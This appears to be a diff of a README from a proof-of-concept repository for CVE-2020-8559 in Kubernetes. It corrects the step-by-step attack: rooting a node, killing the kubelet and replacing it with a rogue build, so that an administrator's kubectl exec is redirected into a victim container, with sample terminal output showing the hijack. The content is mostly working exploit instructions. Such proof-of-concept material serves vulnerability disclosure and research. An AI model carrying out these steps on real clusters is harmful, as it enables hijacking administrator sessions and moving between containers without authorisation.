@@ -73,15 +73,17 @@ go build
 
 1. Get root on a Node
 2. Copy the rouge `kubelet` binary to the Node
-3. Stop the `kubelet` process and over-write it with the rouge binary
-`ps aux |grep kubelet`
-Find the PID of the `kubelet` process
-`sudo kill $PID ; sudo kubelet /usr/local/bin/kubelet`
-4. Kill the `kubelet` process again so that it will re-start with the rouge binary
-`ps aux |grep kubelet`
-Find the PID of the `kubelet` process
-`sudo kill $PID`
-5. If configured to attack ad amdin using the `kubectl` command on their local workstation, This command should return the hostname of the Victim Container instead of the container it should have been executed on
+3. Stop the `kubelet` process and over-write the binary with the rouge binary  
+Find the PID of the `kubelet` process  
+`ps aux |grep kubelet`  
+Kill the `kubelet` process and copy the rouge binary into place  
+`sudo kill $PID ; sudo cp kubelet /usr/local/bin/kubelet`  
+4. Kill the `kubelet` process again so that it will re-start with the rouge binary  
+Find the PID of the `kubelet` process  
+`ps aux |grep kubelet`  
+Kill the `kubelet` process  
+`sudo kill $PID`  
+5. If configured to attack an admin using the `kubectl` command on their local workstation, This command should return the hostname of the Victim Container instead of the container it should have been executed on
 ```
 [0038][tdwyer@tdwyer-nuc:~/CVE-2020-8559]$ kubectl exec attacker-5cf89b94db-xdbfm -- hostname
 victim-675759495f-pmfbk
